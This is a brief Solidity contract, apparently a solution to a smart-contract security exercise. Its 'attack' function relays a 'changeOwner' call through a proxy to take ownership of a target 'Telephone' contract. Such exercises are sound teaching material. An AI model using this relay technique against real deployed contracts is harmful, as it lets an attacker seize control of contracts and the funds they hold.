pragma solidity ^0.8.4;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneProxy {
    address targetAddr;

    constructor(address _targetAddr) {
        targetAddr = _targetAddr;        
    }

    function attack(address _owner) public {
        ITelephone target = ITelephone(targetAddr);
        target.changeOwner(_owner);
    }
}